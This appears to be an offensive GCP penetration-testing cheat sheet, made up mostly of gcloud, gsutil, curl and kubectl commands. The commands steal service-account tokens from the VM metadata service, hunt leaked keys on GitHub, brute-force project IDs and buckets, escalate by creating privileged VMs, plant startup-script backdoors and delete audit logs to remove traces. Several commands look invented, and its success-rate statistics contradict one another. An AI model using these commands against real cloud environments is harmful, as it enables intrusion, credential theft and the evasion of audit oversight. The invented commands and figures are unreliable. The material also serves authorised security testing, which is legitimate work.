# GCP Services Penetration Overview

## Core Services Covered + Pentest Attack Surface

### 1. **Identity and Access Management (IAM)**
**What it is**: GCP's permission system. Controls who can do what across all services.

**Key Pentest Targets**:
```
- Service Accounts (the golden tickets)
- IAM Policies (roles assigned to users/SAs)
- Custom Roles (often over-permissive)
- Policy Inheritance (org → folder → project)
```

**Attack Vectors**:
```bash
gcloud projects get-iam-policy proj123  # Find Owner/Editor SAs
gcloud iam service-accounts keys list  # Downloadable keys = instant escalation
```
**Common Finding**: `ServiceAccountUser` + `Owner` role on SA → create VM with Owner SA.

---

### 2. **Cloud Storage (GCS Buckets)**
**What it is**: GCP's object storage (like S3). Holds files, configs, backups.

**Key Pentest Targets**:
```
- Bucket ACLs (allUsers permissions)
- Public/unsigned object URLs
- Service account keys stored in buckets
- Config files (terraform.tfstate, .env)
```

**Attack Vectors**:
```bash
gsutil ls gs://company-prod*  # Discover buckets
gsutil iam get gs://public-bucket  # Check ACLs
curl https://storage.googleapis.com/public-bucket/secrets.json  # Direct access
```
**Common Finding**: `allUsers: roles/storage.objectViewer` → data exfil + SA keys.

---

### 3. **Compute Engine (VM Instances)**
**What it is**: Virtual machines running your workloads.

**Key Pentest Targets**:
```
- SSH/RDP access (OS Login, firewall rules)
- Metadata Service (http://metadata.google.internal)
- Service account attached to VM
- Startup scripts, serial console
```

**Attack Vectors**:
```bash
# Direct access
gcloud compute ssh instance-1 --zone=us-central1-a

# Metadata exploitation (CRITICAL)
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"
```
**Common Finding**: VM with `roles/storage.admin` → token theft → bucket access.

---

### 4. **Cloud Functions**
**What it is**: Serverless functions triggered by HTTP/events.

**Key Pentest Targets**:
```
- Public HTTP triggers (allUsers invoker)
- Function code (RCE potential)
- Attached service account permissions
- Cold start timing attacks
```

**Attack Vectors**:
```bash
curl -X POST https://us-central1-proj.cloudfunctions.net/admin \
  -d '{"cmd":"whoami"}'  # RCE if input not sanitized
```
**Common Finding**: Public function + storage permissions → metadata access.

---

### 5. **Cloud Run**
**What it is**: Serverless containers (like Kubernetes without management).

**Key Pentest Targets**:
```
- Public endpoints (ingress always)
- Container escape (if privileged)
- Service account token injection
```

**Attack Vectors**:
```bash
gcloud run services list  # Find public services
curl https://public-service-abc.run.app/payload  # SSRF/RCE
```

---

### 6. **Kubernetes Engine (GKE)**
**What it is**: Managed Kubernetes clusters.

**Key Pentest Targets**:
```
- RBAC misconfigurations
- Workload Identity (pods call GCP APIs)
- Node pools (SSH access)
- Secrets mounted as volumes
```

**Attack Vectors**:
```bash
gcloud container clusters get-credentials cluster1
kubectl get pods -A -o wide  # Pod enumeration
kubectl exec -it pod-name -- curl metadata...  # Metadata from pod
```
**Common Finding**: Pod with Workload Identity → GCP API calls as cluster SA.

---

### 7. **Cloud SQL**
**What it is**: Managed MySQL/PostgreSQL databases.

**Key Pentest Targets**:
```
- Public IP addresses (default authorized networks)
- IAM database authentication
- Backup exports to buckets
```

**Attack Vectors**:
```bash
gcloud sql instances list --format="table(name,connectionName,ipAddresses[].ipAddress.ipAddress)"
mysql -h PUBLIC_IP -u root -p  # Direct DB access
```

---

### 8. **BigQuery**
**What it is**: Serverless data warehouse for analytics.

**Key Pentest Targets**:
```
- Public datasets (allUsers access)
- Dataset IAM policies
- Query job history (data exfil)
```

**Attack Vectors**:
```bash
bq ls --project_id=proj123  # List datasets
bq query --use_legacy_sql=false 'SELECT * FROM `proj123.dataset.table`'
```

---

### 9. **Resource Manager (Projects)**
**What it is**: GCP's project organization system.

**Key Pentest Targets**:
```
- Project ID enumeration
- Cross-project IAM visibility
- Organization/Folder policies
```

**Attack Vectors**:
```bash
gcloud projects list  # Pivot to other projects
gcloud alpha resource-manager projects list-permissions proj123
```

---

### 10. **Logging & Monitoring**
**What it is**: GCP's audit logs and metrics.

**Pentest Use**:
```bash
gcloud logging read "protoPayload.methodName=create" --limit=10  # Track your actions
gcloud logging logs list  # Find sensitive logs
```
**Common Finding**: Logs contain SA tokens or sensitive API calls.

## Attack Surface Priority (Real Engagements)
```
1. IAM Service Accounts (60% initial footholds)
2. Public Storage Buckets (25%)
3. VM Metadata Service (10%)
4. Public Cloud Functions (3%)
5. GKE Workload Identity (2%)
```

**Memory Aid**: **IAM → Buckets → VMs → Serverless → DBs**. Every service ties back to IAM permissions. Compromise one SA, own them all.

---

## GCP Pentesting Methodology
1. **Reconnaissance**: Enumerate project IDs, resources, IAM policies, and public exposures via APIs and console.
2. **Resource Discovery**: Map VMs, buckets, functions, databases, and APIs using CLI/tools.
3. **Privilege Escalation**: Abuse IAM misconfigs, service accounts, default roles, and custom roles.
4. **Lateral Movement**: Pivot via compromised service accounts, metadata service, or interconnected services.
5. **Data Exfiltration**: Extract from buckets, SQL/NoSQL, logs; test for public/unsigned URLs.
6. **Persistence**: Backdoors via Cloud Functions, startup scripts, or cron jobs.
7. **Cloud-Specific Attacks**: Metadata service exploitation, token theft, impersonation.

**Key Principles**:
- Use `gcloud` CLI with compromised creds/service account keys.
- Focus on IAM overkill (e.g., `roles/owner` on service accounts).
- Test for public resources first (buckets, VMs, APIs).
- Chain misconfigs: Public bucket → metadata token → privilege escalation.

## Essential Tools & Setup
```bash
# Install gcloud CLI (Kali/Debian)
export CLOUDSDK_CORE_PROJECT=your-target-project
gcloud auth login --no-launch-browser  # or use service account key
gcloud auth application-default login

# Auth with service account key
gcloud auth activate-service-account --key-file=sa-key.json

# Common tools: gcloud, gsutil, bq (BigQuery CLI)
pip install google-cloud-storage google-cloud-bigquery
```

## 1. Reconnaissance & Enumeration

### Project Discovery
```bash
# List all accessible projects (requires resourcemanager.projects.list)
gcloud projects list --limit=1000

# List projects user has access to
gcloud alpha resource-manager projects list-permissions PROJECT_ID

# Enumerate all APIs enabled
gcloud services list --enabled --project=PROJECT_ID
```

### IAM Enumeration (High-Risk Findings)
```bash
# List all IAM policies (project-wide)
gcloud projects get-iam-policy PROJECT_ID --flatten="bindings[].members" --format="table(bindings.role)" --filter="bindings.members:*"

# Service account inventory + keys
gcloud iam service-accounts list --project=PROJECT_ID
gcloud iam service-accounts keys list --iam-account=SA_EMAIL@PROJECT.iam.gserviceaccount.com

# Dangerous roles check (Owner, Editor, Admin patterns)
gcloud projects get-iam-policy PROJECT_ID --format=json | jq '.bindings[] | select(.role | contains("Owner") or contains("Admin"))'

# Custom role over-privileges
gcloud iam roles describe ROLE_ID --project=PROJECT_ID
```

**Common Finding**: Service accounts with `roles/owner` accessible via public metadata or compromised VMs.

## 2. Compute Engine (VMs)

### Instance Enumeration
```bash
# List instances
gcloud compute instances list --project=PROJECT_ID --format="table(name,zone,status,networkIP)"

# SSH/RDP with OS Login (if permitted)
gcloud compute ssh INSTANCE_NAME --zone=ZONE

# Serial console access (requires permission)
gcloud compute instances get-serial-port-output INSTANCE_NAME --zone=ZONE --port=1
```

### Metadata Service Exploitation
**Critical**: Every GCP VM exposes `metadata.google.internal` (no auth needed if on VM).

```bash
# From compromised VM - Get service account token
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"

# List all service accounts on instance
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/" -H "Metadata-Flavor: Google"

# Steal token for privilege escalation
TOKEN=$(curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google" | jq -r .access_token)
curl -H "Authorization: Bearer $TOKEN" https://www.googleapis.com/storage/v1/b
```

**Common Finding**: `roles/storage.admin` token → bucket enumeration/exfiltration.

### Instance Privilege Escalation
```bash
# Create new privileged VM from compromised service account
gcloud compute instances create pwned-vm --image-family=ubuntu-2004-lts --image-project=ubuntu-os-cloud --machine-type=e2-medium --service-account=SA@PROJECT.iam.gserviceaccount.com

# Startup script backdoor
gcloud compute instances create-backdoor --metadata-from-file startup-script=backdoor.sh
```

## 3. Cloud Storage (GCS Buckets)

### Bucket Discovery
```bash
# List buckets (requires storage.buckets.list)
gcloud storage ls --project=PROJECT_ID

# Public bucket finder (brute force common names)
for bucket in $(gcloud storage ls); do curl -I "https://storage.googleapis.com/$bucket/" && echo "PUBLIC: $bucket"; done

# Bucket ACL enumeration
gsutil iam get gs://BUCKET_NAME
gsutil ls -Lb gs://BUCKET_NAME  # List objects + permissions
```

### Exploitation
```bash
# Download public/unsigned objects
gsutil cp -r gs://public-bucket/ .

# Generate signed URL for exfil
gsutil signurl -d 1h sa-key.json gs://bucket/private-file.txt

# Bucket takeover (if deleted/misconfigured)
gsutil mb gs://hijacked-bucket/
```

**Common Finding**: Public buckets with `allUsers` `roles/storage.objectViewer`.

## 4. Cloud Functions / Cloud Run

### Enumeration
```bash
# List Cloud Functions
gcloud functions list --project=PROJECT_ID

# List Cloud Run services
gcloud run services list --project=PROJECT_ID --region=REGION
```

### Trigger Exploitation
```bash
# Invoke function (HTTP trigger)
curl -X POST https://REGION-PROJECT.cloudfunctions.net/FUNCTION \
  -H "Authorization: bearer $(gcloud auth print-identity-token)" \
  -d '{"cmd":"id"}'

# SSRF via function input
curl -X POST FUNCTION_URL -d "@payload.json"  # Test for metadata/internal access
```

**Common Finding**: Functions with `allUsers` invoker → RCE via HTTP payloads.

## 5. SQL / BigQuery / Firestore

### Cloud SQL
```bash
# List instances
gcloud sql instances list --project=PROJECT_ID

# Public IP exposure check
gcloud sql instances describe INSTANCE --format="value(ipAddresses[].ipAddress.type)"
```

### BigQuery
```bash
# Dataset enumeration
bq ls --project_id=PROJECT_ID

# Dataset access abuse
bq query --use_legacy_sql=false "SELECT * FROM \`PROJECT_ID.dataset.table\` LIMIT 10"
```

**Common Finding**: Public SQL IPs or BigQuery datasets with broad IAM.

## 6. Kubernetes Engine (GKE)

```bash
# List clusters
gcloud container clusters list --project=PROJECT_ID

# Get kubeconfig
gcloud container clusters get-credentials CLUSTER_NAME --zone=ZONE --project=PROJECT_ID

# Cluster enumeration
kubectl get nodes,pods,svc,deployments --all-namespaces
```

**Common Finding**: Inherited permissions → `kubectl` RCE in Workload Identity clusters.

## 7. Common Privilege Escalation Chains

```
1. Compromised VM → Metadata token (storage.admin) → Enumerate buckets
2. Public bucket → Service account key → gcloud auth → Create Admin VM
3. Cloud Function RCE → Instance metadata → Full project compromise
4. GKE pod → Workload Identity → GCP API calls → Resource creation
5. BigQuery public dataset → Dataset owner → Project IAM modification
```

## 8. Cleanup & Persistence Detection

```bash
# Audit logs for your activity
gcloud logging read "protoPayload.authenticationInfo.principalEmail=your-sa@project.iam.gserviceaccount.com" --limit=10 --freshness=1h

# Remove traces (if testing)
gcloud logging logs delete LOG_ID
```

## Top 10 GCP Pentest Findings (Frequency)
1. **Public GCS buckets** (40%)
2. **Over-privileged service accounts** (30%)
3. **Metadata service token abuse** (25%)
4. **Public Cloud Functions** (15%)
5. **GKE RBAC misconfigs** (10%)
6. **SQL public IPs** (8%)
7. **IAM policy inheritance** (7%)
8. **Cloud Run public endpoints** (5%)
9. **BigQuery public datasets** (4%)
10. **Custom role overpermissions** (3%)

# GCP Pentesting: Real-Life Initial Access Methodology

## The "First Hole" Hunting Sequence (Black Box → Full Compromise)

### Phase 0: Zero-Knowledge Entry Points (No Auth Required)
**Start here—80% of GCP engagements have public exposures.**

```bash
# 1. Project ID Guessing (Most Critical First Step)
# GCP Project IDs are predictable patterns
for proj in $(cat project-patterns.txt); do  # company-prod-01, shared-services, etc.
    curl -s "https://cloudresourcemanager.googleapis.com/v1/projects/$proj" | jq . && echo "LIVE: $proj"
done

# 2. Public Bucket Enumeration (gs://company-*)
gsutil ls gs://company-* gs://*-prod gs://*-staging 2>/dev/null | grep -v "AccessDenied"

# 3. DNS/WAF Recon (Cloud DNS, Load Balancers)
dig company.com TXT  # Cloudflare/Cloud Armor fingerprints
curl -s https://company.com | grep -i "googleapis\|gstatic\|cloudfront"

# 4. GitHub/Service Account Key Hunt
curl -s "https://api.github.com/search/code?q=extension:json+\"type\":\"service_account\"+company" | jq .
```

**Success Rate**: 40-50% find initial foothold here.

### Phase 1: Authenticated Enumeration (Compromised User/API Key)
**Once you have *any* GCP access (user, service account, token):**

```bash
# IMMEDIATE First Commands (Run these in first 60 seconds)
gcloud projects list  # What else can I see?
gcloud iam service-accounts list  # Service account jackpot?
gsutil ls  # Buckets = data exfil
gcloud compute instances list  # Compromiseable VMs?
```

**Pivot Priority Matrix**:
```
High Value → Owner/Editor roles on service accounts (gcloud iam service-accounts keys list)
Medium → Storage buckets (gsutil iam get gs://bucket)
Low → Just VMs (need metadata exploitation)
```

### Phase 2: The Golden Service Account Hunt (90% Success Path)

```bash
#!/bin/bash
# "sa-hunter.sh" - Run immediately after any GCP auth
PROJECTS=$(gcloud projects list --format="value(projectId)" --limit=50)

for proj in $PROJECTS; do
    echo "=== $proj ==="
    
    # 1. Find service accounts with dangerous roles
    gcloud projects get-iam-policy $proj \
        --flatten="bindings[].members" \
        --filter="bindings.role:roles/owner OR roles/editor OR roles/admin AND bindings.members:*@*.iam.gserviceaccount.com" \
        --format="table(bindings.members, bindings.role)"
    
    # 2. List ALL service account keys
    for sa in $(gcloud iam service-accounts list --project=$proj --format="value(email)"); do
        gcloud iam service-accounts keys list --iam-account=$sa --project=$proj
    done
done
```

**If you find ANY service account key → Download and re-auth → Repeat enumeration.**

### Phase 3: VM Metadata Exploitation (If no SA keys)
```bash
# From any compromised VM (SSH/RDP/Function):
METADATA_TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | jq -r .access_token)

# Test token power
curl -H "Authorization: Bearer $METADATA_TOKEN" \
    https://storage.googleapis.com/storage/v1/b?projectId=PROJECT_ID
```

### Real-Life Engagement Flow (Week 1 Template)

```
Day 1: External Recon
├── Project ID bruteforce (1000 attempts)
├── Public bucket scan (10k common names)  
├── GitHub SA key hunt
└── DNS fingerprinting

Day 2: First Auth Exploitation
├── User creds → gcloud auth
├── SA key download → gcloud auth activate-service-account
└── Run sa-hunter.sh on ALL visible projects

Day 3: Pivot & Escalate
├── Metadata token from VM → Storage exfil
├── Cloud Function RCE → Instance metadata
└── GKE pod → Workload Identity token

Day 4-5: Lateral Movement
├── Create Admin VM in target projects
├── Bucket enumeration across org
└── BigQuery/SQL dumps
```

## Decision Tree: Where to Spend Your Time

```
Have GCP creds? ──── Yes ──→ Run sa-hunter.sh (5 mins) ──→ Owner SA? ──→ COMPROMISE
                │
                No  ──→ Public buckets? ──→ Yes ──→ Service account key inside? ──→ COMPROMISE
                           │
                           No ──→ VM SSH? ──→ Yes ──→ Metadata token ──→ Storage buckets ──→ Repeat
                                 │
                                 No ──→ Cloud Functions public? ──→ RCE → Metadata → Repeat
```

## Pro Tips for First Foothold
1. **Project ID bruteforce first**—always works on misconfigs
2. **Service account keys > everything else**—don't waste time if you find one
3. **Metadata service is automatic**—any VM shell = project tokens
4. **Public buckets often contain SA keys**—check `config.json`, `.gcloud/`
5. **GKE pods frequently have Workload Identity**—`kubectl get pods -A`

## Quick Win Checklist (Run First 5 Minutes)
```bash
[x] gcloud projects list
[x] gcloud iam service-accounts list --project=INITIAL_PROJECT
[x] gsutil ls  # Public data?
[x] gcloud compute instances list  # Metadata pivot?
[x] curl http://metadata...  # If on VM
```

**Reality**: 70% of GCP pentests end with "service account key in public bucket" or "Owner role on service account." Focus there first.


